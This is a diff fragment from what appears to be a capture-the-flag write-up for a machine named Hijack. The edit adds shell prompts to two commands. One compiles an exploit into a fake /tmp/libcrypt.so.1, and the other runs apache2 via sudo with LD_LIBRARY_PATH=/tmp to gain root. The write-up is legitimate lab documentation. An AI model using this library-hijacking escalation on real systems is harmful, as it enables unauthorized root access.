@@ -428,11 +428,11 @@ void hijack() {
 
 Then, I compiled my script and output it to `/tmp/libcrypt.so.1`:
 ```bash
-gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/exploit.c
+rick@Hijack:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/exploit.c
 ```
 Finally, I ran `apache2` with `sudo`, while while settings the `LD_LIBRARY_PATH` environment variable to `/tmp`:
 ```bash
-sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+rick@Hijack:~$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
 ```
 
 As described, the process results in escalation to root:
